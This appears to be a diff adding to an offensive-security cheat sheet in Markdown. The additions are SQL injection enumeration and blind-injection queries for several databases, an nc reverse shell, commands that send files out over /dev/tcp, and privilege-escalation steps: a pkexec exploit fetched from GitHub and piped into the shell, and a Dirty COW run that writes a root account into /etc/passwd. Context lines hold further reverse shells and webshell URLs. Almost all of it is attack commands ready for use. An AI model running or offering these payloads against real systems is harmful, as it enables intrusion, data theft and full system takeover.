@@ -79,6 +79,9 @@
 	- `echo passthru("whoami")`
 	- `echo shell_exec("whoami")` 
 	- `echo exec("whoami")`
+- Check disable function
+    - `phpinfo();`
+    - `<?php var_dump(ini_get('disable_functions'));`
 - Bypass Disable Function
     - https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php
 - Wrapper
@@ -168,10 +171,12 @@
     - Upload and Enable
     - `http://{doamin}/wp-content/plugins/wonderfulwebshell/wonderfulwebshell.php?cmd=ls`
 ### MySQL injection
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
 #### SQL Command
 - Limit
     - `LIMIT 0,1` , `LIMIT 1,1` , `LIMIT 2,1` ...
         - Select only 1 data
+    - `LIMIT 1 OFFSET 0`, `LIMIT 1 OFFSET 1`
 - Substring
     - `SUBSTRING("ABC",1,1)`
         - Will return `A`
@@ -183,8 +188,17 @@
 - Concat
     - `concat(1,':',2)`
         - Will return `1:2`
-- group_concat
-    - Concatenate multiple data to online string
+- Group concat
+    - `group_concat()`
+    - Concatenate multiple data to one line string
+- String Length
+    - `length()`
+- Row counts
+    - `count()`
+- Current db
+    - `database()`
+- Distinct item
+    - `distinct()`
 #### Dump Data
 - DB name
     - `select schema_name from information_schema.schemata`
@@ -198,9 +212,28 @@
     - `select concat(user,':',password) from mysql.user`
 - Command dump
     - `mysqldump -u {username} -h localhost -p {dbname}  > a.sql`
+        - `--all-databases`
 #### File
 - Write file
     - `SELECT "meow" INTO OUTFILE "/tmp/a";`
+### PostgreSQL injection
+- Current 
+    - db
+        - `current_database()`
+    - schema
+        - `current_schema` (without `()`)
+- DB names
+    - `SELECT datname FROM pg_database`
+- Schema names
+    - `SELECT schemaname FROM pg_tables`
+- Table names
+    - `SELECT tablename FROM pg_tables WHERE schemaname='{schemaname}'`
+- Column name
+    - `SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema name}'`
+- Select Data
+    - `SELECT {column} FROM {SCHEMA}.{TABLE}`
+- Conditional time delays
+    - `SELECT CASE WHEN ({condition}) THEN pg_sleep(10) ELSE pg_sleep(0) END`
 ### MSSQL injection
 #### SQL Command
 - `SELECT quotename({col_name}) FROM {DB} FOR XML PATH('')`
@@ -211,6 +244,12 @@
     - Select other DB
 - `CONVERT(int,{command})`
     - Error based
+- Concatenation String
+    - `'aaa'+'bbb'`
+- String length
+    - `LEN()`
+- Current DB
+    - `db_name()`
 #### Dump DB Name
 - `DB_NAME({NUM})`
     - NUM start from 1
@@ -228,9 +267,18 @@
 #### Dump column name
 - One line
     - `SELECT quotename(name) FROM {DB_NAME}..syscolumns WHERE id=(SELECT id FROM {DB_NAME}..sysobjects WHERE name='{TABLE_NAME}') FOR XML PATH('')))) -- -`
+- Select One Data
+    - `SELECT column_name FROM information_schema.columns WHERE table_catalog='{DB NAME}' AND table_name='{TABLE_NAME}'`
 #### DB Admin
 - `select concat(user,',',password),NULL from master.dbo.syslogins -- -`
 ### Oracle Injection
+- Concatenation String
+    - `'aaa'||'bbb'`
+- Sub string
+    - `SUBSTR('ABC',1,1)`
+        - Return `A`
+    - `SUBSTR('ABC',2,1)`
+        - Return `B`
 - Union based
     - Column counts, Data type must be same (`NULL`)
     - Select must have `FROM`, if no item can FROM, use `dual`
@@ -239,6 +287,8 @@
     - `SELECT USER FROM dual`
 - Dump DB (Schema) Names
     - `SELECT DISTINCT OWNER FROM ALL_TABLES` (return multiple rows)
+    - Common (Normal DB) : `APEX_040200`, `MDSYS`, `SEQUELIZE`, `OUTLN`, `CTXSYS`, `OLAPSYS`, `FLOWS_FILES`, `SYSTEM`, `DVSYS`, `AUDSYS`, `DBSNMP`, `GSMADMIN_INTERNAL`, `OJVMSYS`, `ORDSYS`, `APPQOSSYS`, `XDB`, `ORDDATA`, `SYS`, `WMSYS`, `LBACSYS`
+        - But data may in `SYSTEM` or other existing DB
 - Dump Table Names
     - All : `SELECT OWNER,TABLE_NAME FROM ALL_TABLES`
     - Specific DB: `SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{DB_NAME}'`
@@ -249,6 +299,13 @@
 - Select One line using ROWNUM (Doesn't support limit)
     - eg. `SELECT NULL,COLUMN_NAME,3 FROM (SELECT ROWNUM no, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='WEB_ADMINS') where no=1 -- ` 
         - no=1 2 3 ...
+- DB Version
+    - `select version from V$INSTANCE`
+    - `select BANNER from v$version`
+- Error Based
+    - ` SELECT CASE WHEN ({condition}) THEN NULL ELSE to_char(1/0) END FROM dual `
+- Current DB
+    - `SELECT SYS.DATABASE_NAME FROM dual`
 ### SQLite Injection
 - Version
     - `sqlite_version()`
@@ -314,6 +371,8 @@
     	- Write file in local first, and use wget/curl to get to victim machine
     	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
     - `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%27`
+- Nc
+    - `nc {IP} {Port} -e /bin/bash`
 - Python
     - `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &`
 - Make it more interactively
@@ -378,6 +437,9 @@
 	- Send
 		- `nc {attacker_ip} {attacker_port} < {file}`
 		- `cat {file} > /dev/tcp/{ip}/{port}`
+    - TCP
+        - `nc -q 5 -nlvp {Port} < {file}`
+        - `cat<'/dev/tcp/{IP}/{Port}' > {file}`
 - FTP
     - `python3 -m pyftpdlib -p 21 -w`
 ### File Transmission - Windows
@@ -547,7 +609,7 @@
     - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
     - `netsh advfirewall firewall set rule group="remote desktop" new enable=yes`
 - Add User To RDP Group
-    - `net localgroup "Remote Desktop Users" "User name" /add`
+    - `net localgroup "Remote Desktop Users" "{USER_NAME}" /add`
 ## Privilege - Linux
 ### Kernel Exploit
 - [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
@@ -558,6 +620,15 @@
 - [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
 - Compile for old OS
     - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
+- [CVE-2021-4034 (pkexec)](https://haxx.in/files/blasty-vs-pkexec.c)
+    - `gcc blasty-vs-pkexec.c -o meow`
+    - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
+- [2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
+    - ```
+      gcc -pthread 40611.c -o dirtycow
+      ./dirtyc0w /etc/passwd "root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash
+      "
+      ```
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
@@ -633,7 +704,7 @@ iptables -X
 - `/.dockerenv`
 	- If exist, probably in docker 
 - Notice mount point
-- Mount data `/proc/1/mountinfo` (LFI can read)
+- Mount data `/proc/1/mountinfo` , `/proc/self/mounts` (LFI can read)
 ### SOP
 - Check `sudo -l`
 	- What file we can run as super user 
